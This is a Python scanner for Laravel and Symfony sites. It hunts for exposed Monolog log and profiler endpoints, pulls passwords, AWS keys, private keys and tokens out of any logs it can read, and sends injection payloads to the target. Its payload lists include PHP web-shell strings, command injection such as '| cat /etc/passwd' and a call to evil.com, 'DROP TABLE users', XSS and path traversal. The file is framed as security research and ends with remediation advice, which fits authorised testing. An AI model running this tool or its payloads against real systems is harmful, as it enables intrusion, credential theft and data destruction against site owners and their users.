import time
import json
import re
import hashlib
from datetime import datetime
from colorama import Fore, Style, Back, init
from urllib.parse import urljoin, urlparse

# Initialize colorama
init(autoreset=True)

class MonologHijackScanner:
    def __init__(self):
        self.name = "📝 ADVANCED MONOLOG HIJACKING & LOG INJECTION SCANNER"
        self.version = "2.7"
        self.author = "Security Research Team"
        
        # Enhanced color scheme
        self.colors = {
            'banner': Fore.MAGENTA + Style.BRIGHT,
            'header': Fore.WHITE + Style.BRIGHT,
            'info': Fore.CYAN + Style.BRIGHT,
            'success': Fore.GREEN + Style.BRIGHT,
            'warning': Fore.YELLOW + Style.BRIGHT,
            'error': Fore.RED + Style.BRIGHT,
            'critical': Back.RED + Fore.WHITE + Style.BRIGHT,
            'monolog': Fore.BLUE + Style.BRIGHT,
            'log': Fore.CYAN + Style.NORMAL,
            'endpoint': Fore.YELLOW + Style.BRIGHT,
            'sensitive': Fore.RED + Back.BLACK + Style.BRIGHT,
            'json': Fore.GREEN + Style.NORMAL,
            'injection': Fore.MAGENTA + Style.BRIGHT,
            'timestamp': Fore.LIGHTBLACK_EX,
            'separator': Fore.LIGHTBLACK_EX + Style.DIM,
            'highlight': Fore.YELLOW + Back.BLACK + Style.BRIGHT,
            'data': Fore.LIGHTCYAN_EX + Style.BRIGHT,
            'pattern': Fore.LIGHTMAGENTA_EX + Style.BRIGHT
        }
        
        # Comprehensive Monolog endpoints
        self.monolog_endpoints = {
            'common': [
                '/logs',
                '/monolog',
                '/_logs',
                '/app/logs',
                '/var/log',
                '/storage/logs',
                '/log',
                '/debug/log',
                '/api/logs',
                '/admin/logs',
                '/symfony/logs',
                '/laravel/logs',
                '/_profiler/logs',
                '/_debug/logs'
            ],
            'laravel': [
                '/storage/logs/laravel.log',
                '/storage/logs/error.log',
                '/storage/logs/daily.log',
                '/log-viewer',
                '/logs/view',
                '/horizon/logs',
                '/telescope/logs'
            ],
            'symfony': [
                '/_profiler',
                '/_profiler/search',
                '/_profiler/search/results',
                '/_profiler/phpinfo',
                '/_profiler/open',
                '/_profiler/import',
                '/_wdt'
            ],
            'debug': [
                '/debug',
                '/debug/log',
                '/debug/events',
                '/debug/config',
                '/debug/router',
                '/debug/container',
                '/debug/twig',
                '/debug/phpinfo'
            ],
            'admin': [
                '/admin/log-viewer',
                '/admin/logs',
                '/admin/debug',
                '/admin/profiler',
                '/cp/logs',
                '/dashboard/logs',
                '/manager/logs'
            ]
        }
        
        # Monolog detection patterns
        self.monolog_indicators = {
            'strong': [
                r'"channel"\s*:\s*"[^"]+"',
                r'"level_name"\s*:\s*"[^"]+"',
                r'"datetime"\s*:\s*"[^"]+"',
                r'"message"\s*:\s*"[^"]+"',
                r'"context"\s*:\s*\{[^}]+\}',
                r'"extra"\s*:\s*\{[^}]+\}',
                r'Monolog\\\\Handler',
                r'Monolog\\\\Logger',
                r'\[channel\]\s*=>',
                r'\[datetime\]\s*=>',
                r'\[level_name\]\s*=>'
            ],
            'medium': [
                r'log.*record',
                r'log.*entry',
                r'handlers.*\[',
                r'processors.*\[',
                r'log.*level',
                r'DEBUG|INFO|NOTICE|WARNING|ERROR|CRITICAL|ALERT|EMERGENCY',
                r'\[.*\]\s*.*\s*\|',
                r'\[\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2}\]'
            ],
            'weak': [
                r'log',
                r'logger',
                r'monolog',
                r'laravel\.log',
                r'error\.log',
                r'stack.*trace',
                r'exception'
            ]
        }
        
        # Log injection payloads
        self.injection_payloads = {
            'crlf': [
                '\r\n',
                '\n',
                '%0d%0a',
                '%0a',
                '%0d'
            ],
            'php_code': [
                '<?php phpinfo(); ?>',
                '<?php system($_GET[\'cmd\']); ?>',
                '<?php echo "INJECTION_SUCCESS"; ?>',
                '${@phpinfo()}',
                '${system($_GET[\'cmd\'])}'
            ],
            'xss': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert(1)>',
                '" onmouseover="alert(1)"',
                '<svg/onload=alert(1)>'
            ],
            'command': [
                '; ls -la',
                '| cat /etc/passwd',
                '`id`',
                '$(whoami)',
                '|| ping -c 1 evil.com'
            ],
            'sql': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL--",
                "' AND 1=1--"
            ],
            'path_traversal': [
                '../../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                'C:\\Windows\\System32\\drivers\\etc\\hosts'
            ]
        }
        
        # Sensitive data patterns for log analysis
        self.sensitive_patterns = {
            'critical': [
                r'pass(word|wd|)["\']?\s*[:=]\s*["\']([^"\'\s]+)["\']?',
                r'(token|key|secret|api[_-]?key)["\']?\s*[:=]\s*["\']([^"\'\s]+)["\']?',
                r'DB_(PASSWORD|PASS|USER|HOST|NAME)\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
                r'AWS_(ACCESS_KEY|SECRET_KEY)\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
                r'SECRET_KEY\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
                r'PRIVATE_KEY\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
                r'-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----',
                r'oauth_token\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
                r'access_token\s*[=:]\s*[\'"]([^\'"]+)[\'"]'
            ],
            'high': [
                r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
                r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',  # Credit card
                r'\b\d{3}[-\s]?\d{2}[-\s]?\d{4}\b',  # SSN
                r'phone\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
                r'address\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
                r'name\s*[=:]\s*[\'"]([^\'"]+)[\'"]'
            ],
            'medium': [
                r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',
                r'Referer:\s*[^\s]+',
                r'User-Agent:\s*[^\n]+',
                r'Cookie:\s*[^\n]+',
                r'Session-?ID\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
                r'csrf_token\s*[=:]\s*[\'"]([^\'"]+)[\'"]'
            ],
            'low': [
                r'SELECT\s+.+\s+FROM',
                r'INSERT\s+INTO\s+.+\s+VALUES',
                r'UPDATE\s+.+\s+SET',
                r'DELETE\s+FROM\s+.+',
                r'at\s+\w+\.\w+\([^)]+\)',
                r'Exception:\s*[^\n]+',
                r'Error:\s*[^\n]+',
                r'Warning:\s*[^\n]+'
            ]
        }
        
        # Risk levels
        self.risk_levels = {
            'critical': {
                'color': Back.RED + Fore.WHITE + Style.BRIGHT,
                'score': 50,
                'description': 'Active log injection or sensitive credential exposure'
            },
            'high': {
                'color': Fore.RED + Style.BRIGHT,
                'score': 30,
                'description': 'Monolog endpoint with sensitive data exposure'
            },
            'medium': {
                'color': Fore.YELLOW + Style.BRIGHT,
                'score': 20,
                'description': 'Monolog endpoint found without protection'
            },
            'low': {
                'color': Fore.BLUE + Style.BRIGHT,
                'score': 10,
                'description': 'Potential log endpoint discovered'
            }
        }

    def print_banner(self):
        """Display enhanced scanner banner"""
        banner = f"""
{self.colors['banner']}{"="*85}
{self.colors['header']}╔══════════════════════════════════════════════════════════════════════════╗
║ {self.colors['banner']}{self.name:^73} {self.colors['header']}║
║ {self.colors['info']}Version: {self.version:<63} {self.colors['header']}║
║ {self.colors['info']}Author: {self.author:<63} {self.colors['header']}║
╚══════════════════════════════════════════════════════════════════════════╝
{self.colors['banner']}{"="*85}
"""
        print(banner)

    def print_status(self, message, level="info", indent=0, url=None):
        """Print colored status messages with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = {
            "info": f"{self.colors['info']}[ℹ]",
            "success": f"{self.colors['success']}[✓]",
            "warning": f"{self.colors['warning']}[⚠]",
            "error": f"{self.colors['error']}[✗]",
            "critical": f"{self.colors['critical']}[‼]",
            "monolog": f"{self.colors['monolog']}[📝]",
            "endpoint": f"{self.colors['endpoint']}[🔗]",
            "sensitive": f"{self.colors['sensitive']}[🔐]",
            "injection": f"{self.colors['injection']}[💉]",
            "scan": f"{self.colors['info']}[🔍]",
            "json": f"{self.colors['json']}[📊]"
        }.get(level, f"{self.colors['info']}[*]")
        
        indent_str = "  " * indent
        url_str = f" {self.colors['endpoint']}{url}" if url else ""
        print(f"{self.colors['timestamp']}[{timestamp}] {prefix}{Style.RESET_ALL} {indent_str}{message}{url_str}")

    def scan(self, target, options=None):
        """Comprehensive Monolog hijacking and log injection scanning"""
        self.print_banner()
        
        results = {
            'target': target,
            'monolog_endpoints_found': [],
            'injection_vulnerabilities': [],
            'sensitive_data_leaks': [],
            'tested_endpoints': 0,
            'risk_score': 0,
            'start_time': time.time(),
            'end_time': None,
            'scan_duration': None
        }
        
        try:
            from utils.request_wrapper import RequestWrapper
            req = RequestWrapper()
            
            self.print_status(f"Initiating Monolog scan on target: {self.colors['highlight']}{target}", "info")
            
            # Phase 1: Discover Monolog endpoints
            self.print_status("Phase 1: Discovering Monolog endpoints...", "scan")
            endpoints_found = self.discover_monolog_endpoints(target, req)
            results['monolog_endpoints_found'] = endpoints_found['found']
            results['tested_endpoints'] = endpoints_found['tested']
            
            # Phase 2: Analyze discovered endpoints
            if endpoints_found['found']:
                self.print_status("Phase 2: Analyzing Monolog endpoints for vulnerabilities...", "scan")
                analysis_results = self.analyze_endpoints(endpoints_found['found'], req)
                results['injection_vulnerabilities'] = analysis_results['injections']
                results['sensitive_data_leaks'] = analysis_results['leaks']
            
            # Phase 3: Test for log injection
            self.print_status("Phase 3: Testing for log injection vulnerabilities...", "scan")
            injection_results = self.test_log_injection(target, req)
            results['injection_vulnerabilities'].extend(injection_results)
            
            # Calculate risk score
            results['risk_score'] = self.calculate_risk_score(results)
            
            # Complete scan
            results['end_time'] = time.time()
            results['scan_duration'] = results['end_time'] - results['start_time']
            
            # Print comprehensive report
            self.print_summary(results)
            
            return results
            
        except Exception as e:
            self.print_status(f"Scan error: {str(e)}", "error")
            results['error'] = str(e)
            results['end_time'] = time.time()
            return results

    def discover_monolog_endpoints(self, target, req):
        """Discover Monolog endpoints"""
        results = {
            'found': [],
            'tested': 0
        }
        
        # Combine all endpoint categories
        all_endpoints = []
        for category, endpoints in self.monolog_endpoints.items():
            for endpoint in endpoints:
                all_endpoints.append((endpoint, category))
        
        self.print_status(f"Testing {len(all_endpoints)} potential Monolog endpoints...", "info", 1)
        
        for endpoint, category in all_endpoints:
            url = urljoin(target.rstrip('/') + '/', endpoint.lstrip('/'))
            results['tested'] += 1
            
            try:
                response = req.get(url, timeout=10)
                
                if response.status_code == 200:
                    analysis = self.analyze_monolog_response(response)
                    
                    if analysis['is_monolog']:
                        endpoint_info = {
                            'url': url,
                            'endpoint': endpoint,
                            'category': category,
                            'status_code': response.status_code,
                            'content_type': response.headers.get('content-type', ''),
                            'content_length': len(response.content),
                            'confidence': analysis['confidence'],
                            'risk_level': analysis['risk_level'],
                            'detection_method': analysis['detection_method'],
                            'hash': hashlib.md5(response.content).hexdigest()[:8]
                        }
                        
                        results['found'].append(endpoint_info)
                        
                        # Print finding
                        color = self.risk_levels.get(analysis['risk_level'], {}).get('color', Fore.BLUE)
                        self.print_status(f"Monolog endpoint found: {endpoint}", "monolog", 2, url)
                        self.print_status(f"Confidence: {analysis['confidence']}% | Method: {analysis['detection_method']}", "info", 3)
                
                elif response.status_code == 403:
                    self.print_status(f"Access forbidden: {endpoint}", "warning", 2, url)
                elif response.status_code == 401:
                    self.print_status(f"Authentication required: {endpoint}", "warning", 2, url)
                
                time.sleep(0.1)  # Rate limiting
                
            except Exception as e:
                continue
        
        return results

    def analyze_monolog_response(self, response):
        """Analyze response for Monolog indicators"""
        analysis = {
            'is_monolog': False,
            'confidence': 0,
            'risk_level': 'low',
            'detection_method': 'none',
            'indicators_found': []
        }
        
        response_text = response.text
        response_lower = response_text.lower()
        
        # Check for JSON structure first (strong indicator)
        if self.is_json_monolog(response_text):
            analysis['is_monolog'] = True
            analysis['confidence'] = 90
            analysis['risk_level'] = 'high'
            analysis['detection_method'] = 'json_structure'
            analysis['indicators_found'].append('json_structure')
            return analysis
        
        # Check for HTML Monolog interfaces
        if self.is_html_monolog(response_text):
            analysis['is_monolog'] = True
            analysis['confidence'] = 80
            analysis['risk_level'] = 'medium'
            analysis['detection_method'] = 'html_interface'
            analysis['indicators_found'].append('html_interface')
            return analysis
        
        # Check individual patterns
        pattern_matches = 0
        
        for strength in ['strong', 'medium', 'weak']:
            for pattern in self.monolog_indicators[strength]:
                if re.search(pattern, response_text, re.IGNORECASE):
                    pattern_matches += 1
                    analysis['indicators_found'].append(pattern[:50])
                    
                    if strength == 'strong':
                        analysis['confidence'] += 30
                    elif strength == 'medium':
                        analysis['confidence'] += 20
                    else:
                        analysis['confidence'] += 10
        
        # Determine if it's Monolog based on pattern matches
        if pattern_matches >= 3 and analysis['confidence'] >= 40:
            analysis['is_monolog'] = True
            analysis['detection_method'] = 'pattern_matching'
            
            if analysis['confidence'] >= 70:
                analysis['risk_level'] = 'high'
            elif analysis['confidence'] >= 50:
                analysis['risk_level'] = 'medium'
            else:
                analysis['risk_level'] = 'low'
        
        # Cap confidence at 100
        analysis['confidence'] = min(analysis['confidence'], 100)
        
        return analysis

    def is_json_monolog(self, content):
        """Check if content is JSON and contains Monolog structure"""
        try:
            data = json.loads(content)
            
            # Check if it's a list of log entries
            if isinstance(data, list) and len(data) > 0:
                first_item = data[0]
                if isinstance(first_item, dict):
                    # Check for Monolog-specific fields
                    monolog_fields = ['channel', 'level_name', 'datetime', 'message']
                    found_fields = sum(1 for field in monolog_fields if field in first_item)
                    
                    if found_fields >= 3:
                        return True
            
            # Check if it's a single log entry
            elif isinstance(data, dict):
                monolog_fields = ['channel', 'level_name', 'datetime', 'message']
                found_fields = sum(1 for field in monolog_fields if field in data)
                
                if found_fields >= 3:
                    return True
        
        except (json.JSONDecodeError, TypeError):
            pass
        
        return False

    def is_html_monolog(self, content):
        """Check if HTML contains Monolog interface"""
        html_indicators = [
            r'<title>[^<]*Log[^<]*</title>',
            r'<h1>[^<]*Log[^<]*</h1>',
            r'channel.*header',
            r'level.*header',
            r'datetime.*header',
            r'message.*header',
            r'log.*table',
            r'log.*entries',
            r'Monolog.*interface',
            r'Log.*Viewer',
            r'profiler.*container'
        ]
        
        matches = 0
        for pattern in html_indicators:
            if re.search(pattern, content, re.IGNORECASE):
                matches += 1
        
        return matches >= 3

    def analyze_endpoints(self, endpoints, req):
        """Analyze discovered endpoints for vulnerabilities"""
        results = {
            'injections': [],
            'leaks': []
        }
        
        if not endpoints:
            return results
        
        self.print_status(f"Analyzing {len(endpoints)} discovered endpoints...", "info", 1)
        
        for endpoint_info in endpoints:
            url = endpoint_info['url']
            
            try:
                response = req.get(url, timeout=15)
                
                # Check for sensitive data leaks
                leaks = self.check_sensitive_data_leaks(response.text)
                if leaks['found']:
                    leak_info = {
                        'url': url,
                        'endpoint': endpoint_info['endpoint'],
                        'sensitive_data_types': leaks['types'],
                        'sample_data': leaks['samples'],
                        'risk_level': 'high' if 'critical' in leaks['severities'] else 'medium'
                    }
                    results['leaks'].append(leak_info)
                    
                    color = Fore.RED if 'critical' in leaks['severities'] else Fore.YELLOW
                    self.print_status(f"Sensitive data found in {endpoint_info['endpoint']}", "sensitive", 2)
                    self.print_status(f"Types: {', '.join(leaks['types'][:3])}", "info", 3)
                
                # Check for log injection vulnerability
                injection_vuln = self.check_log_injection_vulnerability(url, req)
                if injection_vuln['vulnerable']:
                    injection_info = {
                        'url': url,
                        'endpoint': endpoint_info['endpoint'],
                        'injection_type': injection_vuln['type'],
                        'payload': injection_vuln['payload'],
                        'evidence': injection_vuln['evidence'],
                        'risk_level': 'critical'
                    }
                    results['injections'].append(injection_info)
                    
                    self.print_status(f"Log injection vulnerability found!", "injection", 2)
                    self.print_status(f"Type: {injection_vuln['type']}", "info", 3)
                
                time.sleep(0.2)
                
            except Exception as e:
                continue
        
        return results

    def check_sensitive_data_leaks(self, content):
        """Check for sensitive data in log content"""
        results = {
            'found': False,
            'types': [],
            'severities': [],
            'samples': []
        }
        
        for severity, patterns in self.sensitive_patterns.items():
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
                if matches:
                    results['found'] = True
                    if severity not in results['severities']:
                        results['severities'].append(severity)
                    
                    # Add type based on pattern
                    if 'password' in pattern.lower() or 'pass' in pattern.lower():
                        type_name = 'passwords'
                    elif 'token' in pattern.lower() or 'key' in pattern.lower() or 'secret' in pattern.lower():
                        type_name = 'tokens_keys'
                    elif '@' in pattern:
                        type_name = 'emails'
                    elif 'SELECT' in pattern or 'INSERT' in pattern:
                        type_name = 'sql_queries'
                    elif 'Exception' in pattern or 'Error' in pattern:
                        type_name = 'stack_traces'
                    else:
                        type_name = severity
                    
                    if type_name not in results['types']:
                        results['types'].append(type_name)
                    
                    # Add sample data (first 2 matches)
                    for match in matches[:2]:
                        if isinstance(match, tuple):
                            match_str = ' '.join(str(m) for m in match if m)
                        else:
                            match_str = str(match)
                        
                        if match_str and len(match_str) > 0:
                            results['samples'].append(match_str[:100])
        
        return results

    def check_log_injection_vulnerability(self, url, req):
        """Check if endpoint is vulnerable to log injection"""
        result = {
            'vulnerable': False,
            'type': None,
            'payload': None,
            'evidence': None
        }
        
        # Test CRLF injection (common in log contexts)
        for payload in self.injection_payloads['crlf']:
            try:
                # Try to inject into URL parameters
                parsed_url = urlparse(url)
                query_params = {}
                
                if parsed_url.query:
                    from urllib.parse import parse_qs
                    query_params = parse_qs(parsed_url.query)
                    # Add payload to first parameter
                    for key in query_params:
                        query_params[key] = [payload + query_params[key][0]]
                        break
                
                test_url = url
                if query_params:
                    from urllib.parse import urlencode
                    test_url = parsed_url._replace(query=urlencode(query_params, doseq=True)).geturl()
                
                response = req.get(test_url, timeout=10)
                
                # Check if payload appears in response
                if payload in response.text:
                    result['vulnerable'] = True
                    result['type'] = 'CRLF_Injection'
                    result['payload'] = payload
                    result['evidence'] = response.text[:200]
                    break
                
            except Exception as e:
                continue
        
        return result

    def test_log_injection(self, target, req):
        """Test for log injection vulnerabilities in the application"""
        results = []
        
        self.print_status("Testing for log injection vulnerabilities...", "info", 1)
        
        # Common parameters that might be logged
        loggable_params = [
            'username', 'email', 'name', 'search', 'query',
            'message', 'comment', 'description', 'title',
            'url', 'referer', 'user-agent', 'ip'
        ]
        
        # Test each parameter with injection payloads
        for param in loggable_params[:5]:  # Test first 5 parameters for speed
            for category, payloads in self.injection_payloads.items():
                if category == 'crlf':  # Already tested
                    continue
                
                for payload in payloads[:3]:  # Test first 3 payloads per category
                    try:
                        # Create test data
                        test_data = {param: payload}
                        
                        # Try POST request
                        response = req.post(target, data=test_data, timeout=15)
                        
                        # Check if payload appears in response or if we can detect injection
                        if self.detect_injection_success(response, payload):
                            injection_info = {
                                'type': f'Log_Injection_{category.upper()}',
                                'parameter': param,
                                'payload': payload,
                                'url': target,
                                'evidence': response.text[:200],
                                'risk_level': 'critical'
                            }
                            results.append(injection_info)
                            
                            self.print_status(f"Log injection found: {param} = {payload[:50]}", "injection", 2)
                            break
                    
                    except Exception as e:
                        continue
        
        return results

    def detect_injection_success(self, response, payload):
        """Detect if log injection was successful"""
        # Check if payload appears in response (indicating it was logged and returned)
        if payload in response.text:
            return True
        
        # Check for error messages indicating injection attempt
        error_indicators = [
            r'log.*injection',
            r'invalid.*character',
            r'malformed.*input',
            r'security.*violation',
            r'suspicious.*activity'
        ]
        
        for indicator in error_indicators:
            if re.search(indicator, response.text, re.IGNORECASE):
                return True
        
        return False

    def calculate_risk_score(self, results):
        """Calculate overall risk score"""
        score = 0
        
        # Add scores for discovered endpoints
        for endpoint in results.get('monolog_endpoints_found', []):
            risk_level = endpoint.get('risk_level', 'low')
            score += self.risk_levels.get(risk_level, {}).get('score', 10)
        
        # Add scores for injection vulnerabilities
        for injection in results.get('injection_vulnerabilities', []):
            score += 40  # Critical for injection
        
        # Add scores for sensitive data leaks
        for leak in results.get('sensitive_data_leaks', []):
            if leak.get('risk_level') == 'high':
                score += 30
            else:
                score += 20
        
        # Cap at 100
        return min(score, 100)

    def print_summary(self, results):
        """Print comprehensive scan summary"""
        duration = results.get('scan_duration', 0)
        
        summary = f"""
{self.colors['separator']}{"="*85}
{self.colors['header']}📊 MONOLOG SCAN SUMMARY
{self.colors['separator']}{"-"*85}
{self.colors['info']}Target URL:           {results['target']}
{self.colors['info']}Scan Duration:        {duration:.2f} seconds
{self.colors['info']}Endpoints Tested:     {results['tested_endpoints']}
{self.colors['info']}Monolog Endpoints:    {len(results['monolog_endpoints_found'])}
{self.colors['info']}Injection Vulns:      {len(results['injection_vulnerabilities'])}
{self.colors['info']}Data Leaks:           {len(results['sensitive_data_leaks'])}
{self.colors['info']}Risk Score:           {results['risk_score']}/100
{self.colors['separator']}{"-"*85}
"""
        print(summary)
        
        # Print Monolog endpoints found
        if results['monolog_endpoints_found']:
            print(f"\n{self.colors['header']}📝 MONOLOG ENDPOINTS FOUND ({len(results['monolog_endpoints_found'])}):")
            print(f"{self.colors['separator']}{'-'*85}")
            
            for i, endpoint in enumerate(results['monolog_endpoints_found'], 1):
                color = self.risk_levels.get(endpoint['risk_level'], {}).get('color', Fore.BLUE)
                
                print(f"{color}▶ {i}. {endpoint['endpoint']}")
                print(f"{self.colors['info']}   Category: {endpoint['category']}")
                print(f"{self.colors['info']}   Confidence: {endpoint['confidence']}%")
                print(f"{self.colors['info']}   Method: {endpoint.get('detection_method', 'unknown')}")
                print(f"{self.colors['timestamp']}   URL: {endpoint['url'][:80]}...")
                print(f"{self.colors['separator']}{'-'*40}")
        
        # Print injection vulnerabilities
        if results['injection_vulnerabilities']:
            print(f"\n{self.colors['header']}💉 LOG INJECTION VULNERABILITIES ({len(results['injection_vulnerabilities'])}):")
            print(f"{self.colors['separator']}{'-'*85}")
            
            for i, vuln in enumerate(results['injection_vulnerabilities'], 1):
                print(f"{self.colors['critical']}▶ {i}. {vuln['type']}")
                print(f"{self.colors['info']}   Parameter: {vuln.get('parameter', 'N/A')}")
                print(f"{self.colors['info']}   Payload: {vuln['payload'][:50]}")
                print(f"{self.colors['warning']}   Evidence: {vuln['evidence'][:100]}...")
                print(f"{self.colors['timestamp']}   URL: {vuln['url'][:80]}...")
                print(f"{self.colors['separator']}{'-'*40}")
        
        # Print sensitive data leaks
        if results['sensitive_data_leaks']:
            print(f"\n{self.colors['header']}🔐 SENSITIVE DATA LEAKS ({len(results['sensitive_data_leaks'])}):")
            print(f"{self.colors['separator']}{'-'*85}")
            
            for i, leak in enumerate(results['sensitive_data_leaks'], 1):
                color = Fore.RED if leak['risk_level'] == 'high' else Fore.YELLOW
                
                print(f"{color}▶ {i}. {leak['endpoint']}")
                print(f"{self.colors['info']}   Data Types: {', '.join(leak['sensitive_data_types'][:3])}")
                if leak.get('sample_data'):
                    print(f"{self.colors['warning']}   Samples: {', '.join(leak['sample_data'][:2])}")
                print(f"{self.colors['timestamp']}   URL: {leak['url'][:80]}...")
                print(f"{self.colors['separator']}{'-'*40}")
        
        # Print recommendations
        recommendations = self.generate_recommendations(results)
        if recommendations:
            print(f"\n{self.colors['header']}💡 RECOMMENDATIONS:")
            print(f"{self.colors['separator']}{'-'*85}")
            
            for i, rec in enumerate(recommendations, 1):
                priority_color = {
                    'critical': Back.RED + Fore.WHITE,
                    'high': Fore.RED + Style.BRIGHT,
                    'medium': Fore.YELLOW + Style.BRIGHT,
                    'low': Fore.BLUE + Style.BRIGHT
                }.get(rec['priority'], Fore.WHITE)
                
                print(f"{priority_color}{i}. [{rec['priority'].upper()}] {rec['title']}")
                print(f"{self.colors['info']}   {rec['description']}")
                print()
        
        # Final status
        total_issues = (len(results['monolog_endpoints_found']) + 
                       len(results['injection_vulnerabilities']) + 
                       len(results['sensitive_data_leaks']))
        
        if total_issues > 0:
            if results['risk_score'] > 70:
                print(f"{self.colors['critical']}⚠ CRITICAL MONOLOG VULNERABILITIES DETECTED! Immediate action required.")
            elif results['risk_score'] > 40:
                print(f"{self.colors['warning']}⚠ Monolog security issues found. Review and secure endpoints.")
            else:
                print(f"{self.colors['warning']}⚠ Monolog endpoints discovered. Consider securing or disabling them.")
        else:
            print(f"{self.colors['success']}✅ No Monolog vulnerabilities detected.")
        
        print(f"{self.colors['separator']}{'='*85}\n")

    def generate_recommendations(self, results):
        """Generate targeted recommendations"""
        recommendations = []
        
        # Check for specific issues
        if results['injection_vulnerabilities']:
            recommendations.append({
                'priority': 'critical',
                'title': 'Fix Log Injection Vulnerabilities',
                'description': f'Implement input validation and sanitization for {len(results["injection_vulnerabilities"])} injection points'
            })
        
        if results['sensitive_data_leaks']:
            recommendations.append({
                'priority': 'high',
                'title': 'Secure Sensitive Data in Logs',
                'description': 'Implement data masking and redaction for sensitive information in logs'
            })
        
        if results['monolog_endpoints_found']:
            recommendations.append({
                'priority': 'medium',
                'title': 'Secure Monolog Endpoints',
                'description': f'Restrict access to {len(results["monolog_endpoints_found"])} Monolog endpoints with authentication'
            })
        
        # General recommendations
        recommendations.extend([
            {
                'priority': 'high',
                'title': 'Implement Log Sanitization',
                'description': 'Sanitize all user input before logging to prevent injection attacks'
            },
            {
                'priority': 'medium',
                'title': 'Disable Debug Logs in Production',
                'description': 'Ensure debug and development logs are disabled in production environments'
            },
            {
                'priority': 'low',
                'title': 'Regular Log Audits',
                'description': 'Perform regular audits of log contents and access controls'
            }
        ])
        
        return sorted(recommendations, key=lambda x: {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}[x['priority']])

# Example usage
if __name__ == "__main__":
    scanner = MonologHijackScanner()
    
    # Run scan
    target_url = "http://example.com"
    results = scanner.scan(target_url)
    
    # Additional analysis
    print(f"\n{Fore.CYAN}Generated {len(scanner.monolog_endpoints['common']) + len(scanner.monolog_endpoints['laravel'])} endpoint test cases")
    print(f"{Fore.MAGENTA}Generated {sum(len(p) for p in scanner.injection_payloads.values())} injection payloads")